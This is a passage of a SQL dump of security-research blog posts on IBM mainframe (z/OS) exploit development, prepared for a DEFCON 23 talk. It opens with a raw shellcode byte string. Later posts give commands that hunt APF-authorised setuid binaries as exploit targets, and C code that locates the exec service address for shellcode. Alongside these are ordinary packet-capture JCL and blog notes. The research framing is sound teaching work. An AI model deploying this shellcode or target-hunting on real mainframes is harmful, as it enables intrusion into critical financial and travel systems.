\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122232425262728293031323334\r\n				\r\n						\"\\x90\\xec\\xd0\\x0c\\xc0\\xf0\\xff\\xff\\xff\\xfe\\x18\\xcf\\x17\\x11\\x17\\x22\"\"\\x17\\x33\\xc2\\x19\\x01\\x01\\x01\\x02\\xc2\\x29\\x01\\x01\\x01\\x03\\x17\\x12\"\"\\x18\\x41\\x8b\\x40\\x10\\x01\\x17\\xaa\\x17\\x22\\xc0\\xa1\\xde\\xad\\xbe\\xef\"\"\\x18\\xbc\\x1a\\xb1\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xfc\\x1a\\xb4\"\"\\x58\\x32\\xb0\\x01\\x19\\xa3\\xa7\\x74\\xff\\xf6\\x17\\x22\\x17\\x33\\x1a\\xb1\"\"\\x1b\\xb4\\x50\\xd0\\xb0\\x04\\x50\\xb0\\xd0\\x08\\x18\\xdb\\x18\\x3b\\x1a\\x34\"\"\\x1a\\x34\\x1a\\x34\\x1a\\x34\\x18\\x53\\x1b\\x31\\x18\\x41\\x17\\x11\\x17\\x22\"\"\\x97\\x02\\x30\\x01\\x1a\\x14\\xb9\\xf8\\x10\\x23\\x97\\x02\\x20\\x01\\xa7\\x1e\"\"\\x01\\x70\\xa7\\x44\\xff\\xf9\\x17\\x44\\x58\\xd4\\xb0\\x04\\x0d\\xe5\\xde\\xad\"\"\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\xde\\xad\\xbe\\xef\\x92\\xe9\"\"\\xd2\\x0e\\xc2\\xf2\\xfd\\xfd\\xfd\\xfc\\x5a\\x02\\xf2\\x2a\\x5a\\xf2\\xf2\\x2e\"\"\\x5a\\xe2\\x02\\x12\\x5a\\xec\\x01\\x06\\x5a\\xec\\x02\\xa2\\xb0\\x1a\\xe2\\x02\"\"\\xa5\\xf6\\x02\\x05\\x02\\x02\\x02\\x12\\x02\\xda\\x02\\x02\\x02\\x04\\x1a\\xff\"\"\\x1a\\xd3\\x52\\xf2\\xd2\\x06\\x52\\xd2\\xf2\\x0a\\x5a\\x12\\xf2\\x1a\\x43\\xa2\"\"\\x02\\xda\\x1c\\xaf\\x52\\xa2\\xd2\\x4a\\xc2\\x32\\x02\\x02\\x02\\x75\\xe9\\xe9\"\"\\xd2\\x96\\x02\\x24\\xc2\\xb2\\x02\\x02\\x02\\x77\\x43\\x22\\x02\\x02\\x52\\x22\"\"\\xd2\\x82\\x43\\xe2\\x02\\x05\\x52\\xe2\\xd2\\x86\\x43\\xe2\\xd2\\x82\\x52\\xe2\"\"\\xd2\\x8a\\x1a\\xe0\\x52\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe2\\x12\\x5a\\xe2\"\"\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe0\\x22\\x5a\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\"\"\\xe2\\x1a\\x5a\\xe2\\xd2\\x92\\xd0\\x01\\xd2\\x92\\xe2\\xe6\\x5a\\xe2\\xd2\\x8a\"\"\\x1d\\x02\\x41\\x02\\xe2\\x02\\x5a\\xf2\\xd2\\x92\\x43\\xe2\\xd2\\x82\\x43\\x42\"\"\\xd2\\x86\\x43\\x12\\xd2\\x4e\\x52\\x42\\xd2\\x4e\\x1a\\x49\\x52\\x42\\xd2\\x52\"\"\\x52\\xe2\\xd2\\x56\\x52\\x02\\xd2\\x5a\\x52\\x02\\xd2\\x5e\\x52\\xe2\\xd2\\x62\"\"\\x52\\x02\\xd2\\x66\\x52\\x02\\xd2\\x6a\\x52\\xe2\\xd2\\x6e\\x52\\x02\\xd2\\x72\"\"\\x52\\xe2\\xd2\\x76\\x52\\xe2\\xd2\\x7a\\x52\\xe2\\xd2\\x7e\\xd0\\x01\\xd2\\x0a\"\"\\xd2\\x4a\\x0f\\xed\\x1a\\xf0\\xe9\\xe9\\xd2\\x96\\x02\\x94\\x1a\\x1f\\x5a\\xd2\"\"\\xd2\\x06\\x52\\xf2\\xd2\\x12\\xc2\\xf2\\x02\\x02\\x02\\x02\\x5a\\x02\\xf2\\x32\"\"\\xa5\\xfa\\x02\\x01\\x5a\\xe2\\x02\\x12\\x5a\\xec\\x01\\x06\\x5a\\xec\\x02\\xce\"\"\\xb0\\x1a\\xe2\\x02\\x5a\\xf2\\xd2\\x12\\x5a\\xe2\\xd2\\x0e\\x9a\\x19\\xd2\\x1a\"\"\\x05\\xfc\\x02\\x02\\x02\\x02\\x02\\x12\\x02\\xda\\x02\\x02\\x02\\x02\\x63\\x80\"\"\\x8b\\x97\\x63\\xa0\\x8a\\x02\\xce\\xd7\\xfd\\xf1\\xfd\\xfd\\xfc\\x86\\x02\\x82\"\"\\x42\\x03\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\x02\\xfd\\xf1\\x02\\x02\"\"\\x02\\x96\\x02\\x06\\x96\\x83\\x8b\\x97\\x82\\x02\\xf2\\xf2\\xf2\\xf2\\x8b\\xad\"\"\\xf0\\xf0\"', 'Exploit Development, Mainframe, Reverse Engineering, Security', 'https://www.bigendiansmalls.com/shellcode-freebie/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (46, 'Tips / Tricks – 7/2/15  (update)', 'bigendiansmalls', '2015-07-03T08:03:27+00:00', 'Updated.  Added update to the packet capture section below, included pcap export!\nISPF editor\n\nWant more real estate in your ISPF editor?   In an editing session enter EDSET in the command line, then check the line marked:\n  X Remove action bars in ISPF edit and view panels\nThis will remove the menu bars and give you more room.   If you haven’t already, I’d clear these two settings in the main menu ISPF settings also.\n\n\nUnix System Services\n\nThese commands will help you find / list APF authorized binaries in USS.  First one finds apf auth with sticky bit (suid) set.  These could be great targets for exploits.  Second finds all apf authorized binaries (no dll’s or shared object files).  The ls -E is just a switch to ls, you can use separately to show the extended flags.  an “a” in the display (e.g.  a-s-) means the apf auth bit is set.\n\nfind / -type f -ext a \\( -perm -2000 -o -perm -4000 \\) -exec ls -l {} \\; \nfind / -type f -ext a -exec ls -E {} \\;|grep -v .so|grep -v .dll\n\n\n\nPacket Captures – TCP/IP Networking\n\nGetting a packet capture on a mainframe is a non-trivial event.  I’ll save you the trouble of digging up all the requisite tutorials and lay down my version here:\n\nThere are 4 major components to this effort:\n1) A trace writer proc, put in your favorite PROCLIB, created with JCL such as:\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n//TCPWTR    PROC\r\n//IEFPROC   EXEC PGM=ITTTRCWR,REGION=0K,TIME=1440\r\n//TRCOUT01  DD  DSNAME=<lib>.CTRACE1,UNIT=SYSDA,\r\n//    VOL=SER=<volume>,\r\n//    SPACE=(4096,(100,10),,CONTIG),DISP=(OLD),\r\n//    DCB=(DSORG=PS)\r\n			\r\n				\r\n					\r\n				\r\n					123456\r\n				\r\n						//TCPWTR    PROC//IEFPROC   EXEC PGM=ITTTRCWR,REGION=0K,TIME=1440//TRCOUT01  DD  DSNAME=<lib>.CTRACE1,UNIT=SYSDA,//    VOL=SER=<volume>,//    SPACE=(4096,(100,10),,CONTIG),DISP=(OLD),//    DCB=(DSORG=PS)\r\n					\r\n				\r\n			\r\n		\r\n\r\n2) The TCPIP packet trace functionality. Started with a command like this from the master console or SDSF – (check the link at the bottom for more filter options):\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nV TCPIP,,PKT,ON,FULL,[IP=...],[PORTNUM=...]\r\n			\r\n				\r\n					\r\n				\r\n					1\r\n				\r\n						V TCPIP,,PKT,ON,FULL,[IP=...],[PORTNUM=...]\r\n					\r\n				\r\n			\r\n		\r\n\r\n3) Then, start the writer and execute the capture by issuing the following commands:\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nTRACE CT,WTRSTART=TCPWTR,WRAP\r\nTRACE CT,ON,COMP=SYSTCPDA,SUB=(TCPIP)\r\n  <respond to the WTOR xx>\r\nR XX,WTR=TCPWTR,END\r\n  <do the activity you want traced here>\r\nTRACE CT,ON,COMP=SYSTCPDA,SUB=(TCPIP)\r\nR XX,WTR=DISCONNECT,END\r\nTRACE CT,OFF,COMP=SYSTCPDA,SUB=(TCPIP)\r\nTRACE CT,WTRSTOP=TCPWTR\r\nV TCPIP,,PKT,OFF\r\n			\r\n				\r\n					\r\n				\r\n					12345678910\r\n				\r\n						TRACE CT,WTRSTART=TCPWTR,WRAPTRACE CT,ON,COMP=SYSTCPDA,SUB=(TCPIP)  <respond to the WTOR xx>R XX,WTR=TCPWTR,END  <do the activity you want traced here>TRACE CT,ON,COMP=SYSTCPDA,SUB=(TCPIP)R XX,WTR=DISCONNECT,ENDTRACE CT,OFF,COMP=SYSTCPDA,SUB=(TCPIP)TRACE CT,WTRSTOP=TCPWTRV TCPIP,,PKT,OFF\r\n					\r\n				\r\n			\r\n		\r\n\r\n4) Using the IPCS functionality to format the trace into a spool file.  I use JCL like this (Make sure to modify datasets to match your system):\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n//TCPTRFMT  JOB \'format tcptrace\',\r\n//   \'user\',\r\n//   NOTIFY=&amp;SYSUID,\r\n//   MSGCLASS=H,\r\n//   MSGLEVEL=(1,1)\r\n//DUMP    EXEC PGM=IKJEFT01\r\n//SYSPRINT  DD SYSOUT=*\r\n//SYSUDUMP  DD SYSOUT=*\r\n//SYSTSPRT  DD SYSOUT=*\r\n//PRINTER   DD SYSOUT=*\r\n//SYSPROC   DD DISP=SHR,DSN=SYS1.CLIST\r\n//IPCSPARM  DD DISP=SHR,DSN=SYS1.PARMLIB\r\n//IPCSPRNT  DD SYSOUT=*\r\n//IPCSTOC   DD SYSOUT=*\r\n//IPCSDDIR  DD DSN=<user>.DDIR,DISP=SHR\r\n//SYSTSIN   DD *\r\n IPCS NOPARM\r\n DROPD\r\n SETD DSN(\'<user>.IPCS.CTRACE1\')\r\n CTRACE COMP(SYSTCPDA) LOCAL FULL -  OPTIONS((PACKETTRACE))\r\n END\r\n/*\r\n			\r\n				\r\n					\r\n				\r\n					12345678910111213141516171819202122\r\n				\r\n						//TCPTRFMT  JOB \'format tcptrace\',//   \'user\',//   NOTIFY=&amp;SYSUID,//   MSGCLASS=H,//   MSGLEVEL=(1,1)//DUMP    EXEC PGM=IKJEFT01//SYSPRINT  DD SYSOUT=*//SYSUDUMP  DD SYSOUT=*//SYSTSPRT  DD SYSOUT=*//PRINTER   DD SYSOUT=*//SYSPROC   DD DISP=SHR,DSN=SYS1.CLIST//IPCSPARM  DD DISP=SHR,DSN=SYS1.PARMLIB//IPCSPRNT  DD SYSOUT=*//IPCSTOC   DD SYSOUT=*//IPCSDDIR  DD DSN=<user>.DDIR,DISP=SHR//SYSTSIN   DD * IPCS NOPARM DROPD SETD DSN(\'<user>.IPCS.CTRACE1\') CTRACE COMP(SYSTCPDA) LOCAL FULL -  OPTIONS((PACKETTRACE)) END/*\r\n					\r\n				\r\n			\r\n		\r\n\r\nBonus Step 5)  If you want to export the dump to a pcap file, readable by tcpdump, wireshark and the like, substitute step 4 JCL (the inline portion after DD* only) for something like the following:\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\nIPCS NOPARM\r\nDROPD\r\nSETD  DSN(\'<user>.IPCS.CTRACE1\')\r\nALLOC  F(SNIFFER)  +\r\nDATASET(PACKET.TRC)  SPACE(15 15) TRACK +\r\nREUSE  LRECL(8000) BLKSIZE(32000)\r\nCTRACE COMP(SYSTCPDA)  FULL OPTIONS((SNIFFER(8000,TCPDUMP))\r\nEND\r\n			\r\n				\r\n					\r\n				\r\n					12345678\r\n				\r\n						IPCS NOPARMDROPDSETD  DSN(\'<user>.IPCS.CTRACE1\')ALLOC  F(SNIFFER)  +DATASET(PACKET.TRC)  SPACE(15 15) TRACK +REUSE  LRECL(8000) BLKSIZE(32000)CTRACE COMP(SYSTCPDA)  FULL OPTIONS((SNIFFER(8000,TCPDUMP))END\r\n					\r\n				\r\n			\r\n		\r\n\r\nThen I like to use USS copy and sftp (make sure you use something that does strict binary transfer) to dump the file to your PC and open with Wireshark.  Enjoy!\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n$ cp \"//\'<user>.PACKET.TRC\'\" ./packet.pcap\r\n.....\r\n(then from your pc)\r\nsftp  <uss system>\r\nsftp>  get packet.pcap\r\n			\r\n				\r\n					\r\n				\r\n					12345\r\n				\r\n						$ cp \"//\'<user>.PACKET.TRC\'\" ./packet.pcap.....(then from your pc)sftp  <uss system>sftp>  get packet.pcap\r\n					\r\n				\r\n			\r\n		\r\n\r\nThat’s it .. simple right?\nHere’s some useful links:\nTCPIP Packet Tracing\nHow to collect packet trace on z/OS\nV TCPIP,,PKT command syntax\nZOS IP Diagnosis Guide (SNIFFER CTRACE and others syntax)', 'Exploit Development, Mainframe, Tips', 'https://www.bigendiansmalls.com/tips-tricks-7215/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (47, 'Mainframe shellcode', 'bigendiansmalls', '2015-07-02T10:13:12+00:00', 'Come see my talk at DEFCON23.\r\n\r\n		\r\n		\r\n			\r\n			\r\n			\r\n			\n...\r\nSLR   14,14\r\nMVC   32(4,13),16(14)\r\nL     14,32(,13)\r\n...\r\n\\x1f\\xee\r\n\\xd2\\x03\\xd0\\x20\\xe0\\x10\r\n\\x58\\xe0\\xd0\\x20\r\n...\r\n# id\r\nuid=0(IBMUSER) gid=0(SYS1)\r\n...\r\n			\r\n				\r\n					\r\n				\r\n					123456789101112\r\n				\r\n						...SLR   14,14MVC   32(4,13),16(14)L     14,32(,13)...\\x1f\\xee\\xd2\\x03\\xd0\\x20\\xe0\\x10\\x58\\xe0\\xd0\\x20...# iduid=0(IBMUSER) gid=0(SYS1)...\r\n					\r\n				\r\n			\r\n		\r\n\r\nStay tuned to this site and follow @bigendiansmalls for sneak peeks at what I will be presenting!', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/mainframe-shellcode/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (48, 'Finding the Callable Services', 'bigendiansmalls', '2015-06-19T08:00:25+00:00', 'The posts here won’t initially be in a start-from-the-beginning order.   However, as I get more of them up,  they will contain all the steps to help you set up your Z environment to begin building exploits and shellcode.\nThis post is about finding the addresses of what IBM refers to as the Assembler Callable Services (or sometimes USS Callable Services).  These addresses can be thought of loosely analogous to the Procedure Linkage Table / Global Offset Table duo used in Linux to find addresses of common functions from position independent code.   If mainframe programs are written in a higher level language such as High-Level Assembler (HLASM) or C, these functions can be called and the linker will take care of this for you at runtime.   Since our shellcode needs to be able to mimic this, we will find these addresses ourselves, using examples provided by IBM.\nFirst off, what are these services?   From their documentation, “These services are interfaces between the z/OS operating system and standard (POSIX or Single UNIX Specification) programming functions that require operating system services.”  In other words, these are the common functions needed to build shell code in the Unix System Services environment.   Things like:  exec,  setting up a socket listener, setting up an outbound socket, reading from a socket, opening, writing, reading and closing a file, and many more are all part of the Callable Services Routines (CSR).\nThe examples in Appendix A of the first manual linked below, show the assembler commands to do this lookup.\nExample from Appendix A: Assembler Callable Services\nThe offset mentioned in the last Load line above is a number pulled from a table in the same document, that is specific to the function needed.  For instance, the offset for the BPX1EXC function (basically exec) is 228.   Most people beginning exploit development on System Z won’t be familiar with HLASM or IBM System Z machine code (opcodes) right away, so the code snippets I use here are written in C, but do the same function.\n#include <stdio.h>\n\nint main(int argc, char ** argv){\nunsigned char *loc;\n(loc) = (unsigned char *)0;\n\nmemcpy(&(loc),(loc+16),sizeof(loc));\nprintf(\"Base CVR Address:\\t%#010x\\n\",loc);\nmemcpy(&(loc),(loc+544),sizeof(loc));\nprintf(\"Base CSRTABLE Address:\\t%#010x\\n\",loc);\nmemcpy(&(loc),(loc+24),sizeof(loc));\nprintf(\"Base CSR SLOT Address:\\t%#010x\\n\",loc);\n\nmemcpy(&(loc),(loc+228),sizeof(loc));\nprintf(\"Base BPX1EXC Address:\\t%#010x\\n\",loc);\nreturn 0;\n}\n\nThe program above can be compiled using a simple “cc -o pgm pgm.c” and run within USS.   A JCL version is included at the end of this post.   The output from running the program will look something like this (the addresses will likely vary on your system):\n\nLine by line at a high level here is what’s happening:\nThe initial address is the address of the Communications Vector Table (CVT).  According to IBM’s manual this address is always stored at 0x10, and contains (depending on the offset) locations of many system data structures.  The address stored at location 0x10 is increased by 544 and the resultant location is where the next address is read.   This location yields the base of the Callable Service Routine table (CSRTABLE) – containing many system-wide CSRs.   The services we are looking for (another nested-level deep) is in the slot within this table.\nThis location is again found by taking the address stored in the previously calculated memory location, adding 24 this time (as stated in the manual clip above), and reading yet another address from the resulting location.   This one (0x1532998 in our example) is the base of the table for the routines we want (all of the UNIX services provided).  Once we have it, we can look up in the table (Appendix A of the PDF linked to below) the routine needed.   For our example, offset 228 is added to the address in that location and the final address of the BPX1EXC function is found to be at 0x15333a4.\nThat address can be used, assuming all the registers are set correctly with parameters, environment variables and arguments – to call the function and execute a command.   This is thoroughly documented in the manual (in the usual way-too-much-information style I’ve grown used to) – but I’ll break it down in a future post.\nThe manual for all the services can be found in PDF format on IBM’s website here.\nAnother interesting IBM read on the services here.\nJCL for the same C program used above.\nIn a future post I’ll look at calling one of these commands, using the dbx debugger, how to pull shellcode out of your compiled C program on system Z and test it, and explore the idea of a “return to libc” style attack on this platform.', 'Exploit Development, Mainframe, Security', 'https://www.bigendiansmalls.com/finding-the-callable-services/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (49, 'Adventures in securing a “dinosaur”', 'bigendiansmalls', '2015-06-15T14:03:25+00:00', 'This blog is my own chronicle of adventures in writing exploits, cryptography, security and who knows what else.   Specifically though, I’m going to start by sharing technical specifics to support my upcoming co-talk at Defcon 23.\nOur talk titled “Security Necromancy: Further Adventures in Mainframe Hacking” seeks to educate the security community to actively dig into the z/series (IBM Mainframe) platform by showing how to leverage skills most already have.\nKnow how to write shellcode?  Great!  We will show you how easy it is to parlay those skills into writing shellcode that will execute on System Z.  Understanding fuzzing and exploit research?  Those skills are easy to apply on this platform as well.\nUse your network hacking skills to exploit Network Job Entry (NJE) with some help from Soldier of Fortran to get you started.\nUltimately we want people to understand that, because of its widespread usage as a core system in many critical infrastructures from finance to air travel; its relative obscurity; and lack of real wide-spread exposure to the hacking public; this system is rife with opportunities to be further secured and hardened.  All that is needed is your expertise.\nCome join us for a great show @ DEFCON 23, and watch here for ongoing updates before and after.', 'Mainframe, Security', 'https://www.bigendiansmalls.com/adventures-in-exploiting-a-dinosaur-2/\n');
INSERT INTO `MainFrameSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (50, 'Blog info, errata, other', 'bigendiansmalls', '2015-06-13T10:45:52+00:00', 'Opinions expressed are solely my own and do not express the views or opinions of my employer, or likely anyone else in the world, aside from myself.\nComments are moderated solely for relevance and to prevent spam.\nHow to contact me.', 'Other, Uncategorized', 'https://www.bigendiansmalls.com/blog-info-errata-other/\n');
